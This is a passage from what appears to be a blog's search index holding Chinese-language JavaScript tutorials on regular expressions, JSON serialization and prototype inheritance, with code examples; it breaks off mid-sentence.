class="regexp">/[\s,]+/</span>); <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$/</span>;</span><br><span class="line">re.exec(<span class="string">&#x27;010-12345&#x27;</span>); <span class="comment">// [&#x27;010-12345&#x27;, &#x27;010&#x27;, &#x27;12345&#x27;]</span></span><br><span class="line">re.exec(<span class="string">&#x27;010 12345&#x27;</span>); <span class="comment">// null</span></span><br></pre></td></tr></table></figure><p>通过exec可以提取分组里面的子串，返回一个数组，第一个元素是匹配到的整个字符串，后面跟着子串</p><h3 id="贪婪"><a href="#贪婪" class="headerlink" title="贪婪"></a>贪婪</h3><p>默认匹配是贪婪模式，即尽量往多的匹配</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/^(\d+)(0*)$/</span>;</span><br><span class="line">re.exec(<span class="string">&#x27;102300&#x27;</span>); <span class="comment">// [&#x27;102300&#x27;, &#x27;102300&#x27;, &#x27;&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="非贪婪匹配"><a href="#非贪婪匹配" class="headerlink" title="非贪婪匹配"></a>非贪婪匹配</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/^(\d+？)(0*)$/</span>;</span><br><span class="line">re.exec(<span class="string">&#x27;102300&#x27;</span>); <span class="comment">// [&#x27;102300&#x27;, &#x27;1023&#x27;, &#x27;00&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="特殊标志"><a href="#特殊标志" class="headerlink" title="特殊标志"></a>特殊标志</h3><table><thead><tr><th>标志</th><th>描述</th></tr></thead><tbody><tr><td><code>g</code></td><td>全局搜索。</td></tr><tr><td><code>i</code></td><td>不区分大小写搜索。</td></tr><tr><td><code>m</code></td><td>多行搜索。</td></tr><tr><td><code>s</code></td><td>允许 <code>.</code> 匹配换行符。</td></tr><tr><td><code>u</code></td><td>使用unicode码的模式进行匹配。</td></tr><tr><td><code>y</code></td><td>执行“粘性”搜索,匹配从目标字符串的当前位置开始，可以使用y标志。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解JSON</title>
      <link href="/Front-end/JavaScript/JSON.html"/>
      <url>/Front-end/JavaScript/JSON.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/JSON">JSON</a> 是一种按照JavaScript对象语法的数据格式，这是 <a href="https://en.wikipedia.org/wiki/Douglas_Crockford">Douglas Crockford</a> 推广的。虽然它是基于 JavaScript 语法，但它独立于JavaScript，这也是为什么许多程序环境能够读取（解读）和生成 JSON。 </p><span id="more"></span><p>JSON可以作为一个对象或者字符串存在，前者用于解读 JSON 中的数据，后者用于通过网络传输 JSON 数据。 这不是一个大事件——JavaScript 提供一个全局的 可访问的 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON">JSON</a> 对象来对这两种数据进行转换。</p><p>一个 JSON 对象可以被储存在它自己的文件中，这基本上就是一个文本文件，扩展名为 <code>.json</code>， 还有 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/MIME_type">MIME type</a> 用于 <code>application/json</code>.—MDN</p><h2 id="JSON对象"><a href="#JSON对象" class="headerlink" title="JSON对象"></a>JSON对象</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;squadName&quot;</span> : <span class="string">&quot;Super hero squad&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;homeTown&quot;</span> : <span class="string">&quot;Metro City&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;formed&quot;</span> : <span class="number">2016</span>,</span><br><span class="line">  <span class="attr">&quot;secretBase&quot;</span> : <span class="string">&quot;Super tower&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;active&quot;</span> : <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;members&quot;</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;Molecule Man&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;age&quot;</span> : <span class="number">29</span>,</span><br><span class="line">      <span class="attr">&quot;secretIdentity&quot;</span> : <span class="string">&quot;Dan Jukes&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;powers&quot;</span> : [</span><br><span class="line">        <span class="string">&quot;Radiation resistance&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Turning tiny&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Radiation blast&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;Madame Uppercut&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;age&quot;</span> : <span class="number">39</span>,</span><br><span class="line">      <span class="attr">&quot;secretIdentity&quot;</span> : <span class="string">&quot;Jane Wilson&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;powers&quot;</span> : [</span><br><span class="line">        <span class="string">&quot;Million tonne punch&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Damage resistance&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Superhuman reflexes&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;Eternal Flame&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;age&quot;</span> : <span class="number">1000000</span>,</span><br><span class="line">      <span class="attr">&quot;secretIdentity&quot;</span> : <span class="string">&quot;Unknown&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;powers&quot;</span> : [</span><br><span class="line">        <span class="string">&quot;Immortality&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Heat Immunity&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Inferno&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Teleportation&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Interdimensional travel&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问形式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">superHeroes.hometown</span><br><span class="line">superHeroes[<span class="string">&quot;active&quot;</span>]</span><br><span class="line">superHeroes[<span class="string">&quot;members&quot;</span>][<span class="number">1</span>][<span class="string">&quot;powers&quot;</span>][<span class="number">2</span>]</span><br></pre></td></tr></table></figure><h2 id="JSON数组"><a href="#JSON数组" class="headerlink" title="JSON数组"></a>JSON数组</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;Molecule Man&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;age&quot;</span> : <span class="number">29</span>,</span><br><span class="line">    <span class="attr">&quot;secretIdentity&quot;</span> : <span class="string">&quot;Dan Jukes&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;powers&quot;</span> : [</span><br><span class="line">      <span class="string">&quot;Radiation resistance&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Turning tiny&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Radiation blast&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;Madame Uppercut&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;age&quot;</span> : <span class="number">39</span>,</span><br><span class="line">    <span class="attr">&quot;secretIdentity&quot;</span> : <span class="string">&quot;Jane Wilson&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;powers&quot;</span> : [</span><br><span class="line">      <span class="string">&quot;Million tonne punch&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Damage resistance&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Superhuman reflexes&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>访问形式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span>].powers[<span class="number">0</span>]</span><br><span class="line">[<span class="number">0</span>][<span class="string">&quot;powers&quot;</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>JSON 是一种纯数据格式，它只包含属性，没有方法。</li><li>JSON 要求有两头的 { } 来使其合法。最安全的写法是有两边的括号，而不是一边。</li><li>甚至一个错位的逗号或分号就可以导致  JSON 文件出错。您应该小心的检查您想使用的数据(虽然计算机生成的 JSON 很少出错，只要生成程序正常工作)。您可以通过像 <a href="http://jsonlint.com/">JSONLint</a> 的应用程序来检验 JSON。</li><li>JSON 可以将任何标准合法的 JSON 数据格式化保存，不只是数组和对象。比如，一个单一的字符串或者数字可以是合法的 JSON 对象。虽然不是特别有用处……</li><li>不像 JavaScript 标识符可以用作属性，在 JSON 中，只有字符串才能用作属性。</li></ul><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p><code>stringify()</code>: 接收一个JS对象作为参数，返回一个对应的JSON字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;manuev&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>:<span class="number">19</span>,</span><br><span class="line">    <span class="attr">height</span>:<span class="number">1.60</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> myStirng = <span class="built_in">JSON</span>.stringify(person);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#123;&quot;name&quot;: &quot;manuev&quot;,&quot;age&quot;: 19,&quot;height&quot;: 1.6&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><code>stringify</code>可以传递三个参数，第一个是js对象，第二个是指定输出的对象的属性，可以使用数组，第三个是缩进，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(person,[<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;age&#x27;</span>],<span class="string">&#x27;    &#x27;</span>)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&quot;&#123;</span></span><br><span class="line"><span class="comment">    &quot;name&quot;: &quot;manuev&quot;,</span></span><br><span class="line"><span class="comment">    &quot;age&quot;: 19</span></span><br><span class="line"><span class="comment">&#125;&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>第二个参数还可以传递一个函数，用来处理每个键值对</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(person,</span><br><span class="line">   <span class="function">(<span class="params">k,v</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> v === <span class="string">&#x27;string&#x27;</span>) </span><br><span class="line">           <span class="keyword">return</span> v.toUpperCase();</span><br><span class="line">    <span class="keyword">return</span> v;&#125;,</span><br><span class="line"><span class="string">&#x27;    &#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&quot;&#123;</span></span><br><span class="line"><span class="comment">    &quot;name&quot;: &quot;SHEPHERDEV&quot;,</span></span><br><span class="line"><span class="comment">    &quot;age&quot;: 19,</span></span><br><span class="line"><span class="comment">    &quot;height&quot;: 1.6</span></span><br><span class="line"><span class="comment">&#125;&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>控制js对象的序列化数据，还有一个方法就是在对象里写一个toJSON()方法，里面返回应该处理的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;manuev&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>:<span class="number">19</span>,</span><br><span class="line">    <span class="attr">height</span>:<span class="number">1.60</span>,</span><br><span class="line">    <span class="comment">// 注意不能用箭头函数</span></span><br><span class="line">    <span class="attr">toJSON</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;Name&#x27;</span>: <span class="built_in">this</span>.name,</span><br><span class="line">            <span class="string">&#x27;Age&#x27;</span>: <span class="built_in">this</span>.age</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//&quot;&#123;&quot;Name&quot;:&quot;manuev&quot;,&quot;Age&quot;:19&#125;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p><code>parse()</code>: 以文本字符串形式接受JSON作为参数，并返回相应的JS对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myText = <span class="string">&#x27;&#123; &quot;name&quot; : &quot;manuev&quot;, &quot;age&quot; : &quot;19&quot; &#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> myJSON = <span class="built_in">JSON</span>.parse(myText);</span><br></pre></td></tr></table></figure><p>它的第二个参数也可以接收一个函数用来处理解析的属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse(myText,<span class="function">(<span class="params">k,v</span>)=&gt;</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(k === <span class="string">&#x27;name&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;hello &#x27;</span>+v;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// Object &#123; name: &quot;hello manuev&quot;, age: &quot;19&quot; &#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript原型继承</title>
      <link href="/Front-end/JavaScript/%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%8E%9F%E5%9E%8B.html"/>
      <url>/Front-end/JavaScript/%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%8E%9F%E5%9E%8B.html</url>
      
        <content type="html"><![CDATA[<p>JavaScript 常被描述为一种<strong>基于原型的语言 (prototype-based language)</strong>——每个对象拥有一个<strong>原型对象</strong>，对象以其原型为模板、从原型继承方法和属性。原型对象也可能拥有原型，并从中继承方法和属性，一层一层、以此类推。这种关系常被称为<strong>原型链 (prototype chain)</strong>，它解释了为何一个对象会拥有定义在其他对象中的属性和方法。 </p><span id="more"></span><p>准确地说，这些属性和方法定义在Object的构造器函数(constructor functions)之上的<code>prototype</code>属性上，而非对象实例本身。</p><p>在传统的 OOP 中，首先定义“类”，此后创建对象实例时，类中定义的所有属性和方法都被复制到实例中。在 JavaScript 中并不如此复制——而是在对象实例和它的构造器之间建立一个链接（它是<strong>proto</strong>属性，是从构造函数的<code>prototype</code>属性派生的），之后通过上溯原型链，在构造器中找到这些属性和方法。–<a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Object_prototypes">MDN</a></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>说一下自己的理解，我们在JavaScript创建的函数都有共同的属性叫prototype，它长这样</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span> (<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(test.prototype);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span> </span><br><span class="line">    <span class="attr">constructor</span>: ƒ test()</span><br><span class="line">        <span class="attr">arguments</span>: <span class="literal">null</span></span><br><span class="line">        <span class="attr">caller</span>: <span class="literal">null</span></span><br><span class="line">        <span class="attr">length</span>: <span class="number">0</span></span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">        <span class="attr">prototype</span>: &#123;<span class="attr">constructor</span>: ƒ&#125;</span><br><span class="line">        <span class="attr">__proto__</span>: ƒ ()</span><br><span class="line">        [[FunctionLocation]]: VM123:<span class="number">1</span></span><br><span class="line">        [[Scopes]]: Scopes[<span class="number">2</span>]</span><br><span class="line">    <span class="attr">__proto__</span>:</span><br><span class="line">        <span class="title">constructor</span>: ƒ <span class="title">Object</span>(<span class="params"></span>)</span><br><span class="line">        <span class="title">hasOwnProperty</span>: ƒ <span class="title">hasOwnProperty</span>(<span class="params"></span>)</span><br><span class="line">        <span class="title">isPrototypeOf</span>: ƒ <span class="title">isPrototypeOf</span>(<span class="params"></span>)</span><br><span class="line">        <span class="title">propertyIsEnumerable</span>: ƒ <span class="title">propertyIsEnumerable</span>(<span class="params"></span>)</span><br><span class="line">        <span class="title">toLocaleString</span>: ƒ <span class="title">toLocaleString</span>(<span class="params"></span>)</span><br><span class="line">        <span class="title">toString</span>: ƒ <span class="title">toString</span>(<span class="params"></span>)</span><br><span class="line">        <span class="title">valueOf</span>: ƒ <span class="title">valueOf</span>(<span class="params"></span>)</span><br><span class="line">        <span class="title">__defineGetter__</span>: ƒ <span class="title">__defineGetter__</span>(<span class="params"></span>)</span><br><span class="line">        <span class="title">__defineSetter__</span>: ƒ <span class="title">__defineSetter__</span>(<span class="params"></span>)</span><br><span class="line">        <span class="title">__lookupGetter__</span>: ƒ <span class="title">__lookupGetter__</span>(<span class="params"></span>)</span><br><span class="line">        <span class="title">__lookupSetter__</span>: ƒ <span class="title">__lookupSetter__</span>(<span class="params"></span>)</span><br><span class="line">        <span class="title">get</span> <span class="title">__proto__</span>: ƒ <span class="title">__proto__</span>(<span class="params"></span>)</span><br><span class="line">        <span class="title">set</span> <span class="title">__proto__</span>: ƒ <span class="title">__proto__</span>(<span class="params"></span>)</span><br></pre></td></tr></table></figure><p>向原型中添加属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.prototype.foo = <span class="string">&#x27;bar&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="理解原型对象"><a href="#理解原型对象" class="headerlink" title="理解原型对象"></a>理解原型对象</h3><blockquote><p>原型链中的方法和属性没有被复制到其他对象</p><p>官方并没有规定方法可以直接访问对象原型，原型链的’连接’被定义在内部属性中，在JavaScript中用<code>[[prototype]]</code>表示，在使用chrome和firefox时，提供了<code>__proto__</code>这个属性可以访问原型对象</p></blockquote><p>需要注意的是<code>__proto__</code>和<code>prototype</code>的区别，前者可以访问对象的原型对象，后者包含了一个对象，可以在里面定义被继承的成员，<code>prototype</code>是构造器的专属属性</p><p>而前面说的<code>Object.create()</code>，就是将参数里的对象作为原型对象返回一个新的对象</p><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>每个实例的对象还会从原型中继承<code>constructor</code>属性，该属性就是这个对象的构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = <span class="keyword">new</span> test();</span><br><span class="line"><span class="comment">//下面两种方法都可以得到构造函数</span></span><br><span class="line">o1.constructor;</span><br><span class="line">o1.__proto__.constructor;</span><br></pre></td></tr></table></figure><p>用途1，利用这个构造函数创建对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o2 = <span class="keyword">new</span> o1.constructor();</span><br></pre></td></tr></table></figure><p>用途2，得到构造函数的各种信息</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//名字</span></span><br><span class="line">o1.constructor.name;</span><br><span class="line"><span class="comment">//参数长度</span></span><br><span class="line">o1.constructor.length;</span><br></pre></td></tr></table></figure><h3 id="修改原型"><a href="#修改原型" class="headerlink" title="修改原型"></a>修改原型</h3><p>因为原型链的特性，所以增加构造函数的原型属性时，使用构造函数实例化的对象也可以访问到这个属性，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Person.prototype.newAtrribute = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">alert(<span class="string">&#x27;hello&#x27;</span>+<span class="built_in">this</span>.name[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">person1.newAtrribute();</span><br></pre></td></tr></table></figure><p>注意上面的this是在函数里面的，在使用时就会转换为对象实例</p><blockquote><p>常见的对象定义模式就是，构造器（函数体）里定义属性，prototype属性里定义方法</p></blockquote><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h3 id="原型继承"><a href="#原型继承" class="headerlink" title="原型继承"></a>原型继承</h3><blockquote><p>Java的继承是规定某个类继承自某个类，而JavaScript的继承方式有点特别，被称为 <strong>原型式继承 ——</strong> <strong>prototypal inheritance</strong></p></blockquote><p>先创建一个Person类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">first, last, age, gender</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = &#123;</span><br><span class="line">    first,</span><br><span class="line">    last</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">this</span>.age = age;</span><br><span class="line">  <span class="built_in">this</span>.gender = gender;</span><br><span class="line">&#125;;</span><br><span class="line">Person.prototype.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">&#x27;Hi! I\&#x27;m &#x27;</span> + <span class="built_in">this</span>.name.first + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此时的原型链是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Person() ----&gt; Person.prototype ----&gt; Object.prototype ----&gt; null</span><br></pre></td></tr></table></figure><p>然后需要创建一个Teacher类，它需要继承Person类，并添加一个新的属性<code>subject</code>，重写一个方法<code>greeting</code>，于是有</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Teacher</span>(<span class="params">first, last, age, gender, subject</span>) </span>&#123;</span><br><span class="line">  Person.call(<span class="built_in">this</span>, first, last, age, gender);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">this</span>.subject = subject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>call()</code>表示为Teacher调用了Person构造方法，然后第一个参数绑定this变量</p><blockquote><p>如果继承的是无参函数，那么只需要传递一个this即可</p></blockquote><p>但是它的原型链并没有指向Person，而是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Teacher() ----&gt; Teacher.prototype ----&gt; Object.prototype ----&gt; null</span><br></pre></td></tr></table></figure><p>我们需要的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Teacher() ----&gt; Teacher.prototype ----&gt; Person.prototype ----&gt; Object.prototype ----&gt; null</span><br></pre></td></tr></table></figure><h3 id="原型与构造器引用"><a href="#原型与构造器引用" class="headerlink" title="原型与构造器引用"></a>原型与构造器引用</h3><p>上面Teacher类还不完整，有两个问题</p><p>1.Teacher的原型没有继承自Person</p><p>解决方法，使用create()，得到一个原型是Person的中间对象，并将Teacher的原型指向这个对象(即Teacher的原型对象指向了Person的原型对象)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Teacher.prototype = <span class="built_in">Object</span>.create(Person.prototype);</span><br></pre></td></tr></table></figure><p>2.因为使用了create()，所以Teacher的prototype的constructor指向Person，它应该指向Teacher本身，所以</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Teacher.prototype.constructor = Teacher;</span><br><span class="line"><span class="comment">//再次强调，Teacher后面加括号代表调用</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>注：</strong>每一个函数对象（<code>Function</code>）都有一个<code>prototype</code>属性，并且<em>只有</em>函数对象有<code>prototype</code>属性，因为<code>prototype</code>本身就是定义在<code>Function</code>对象下的属性。当我们输入类似<code>var person1=new 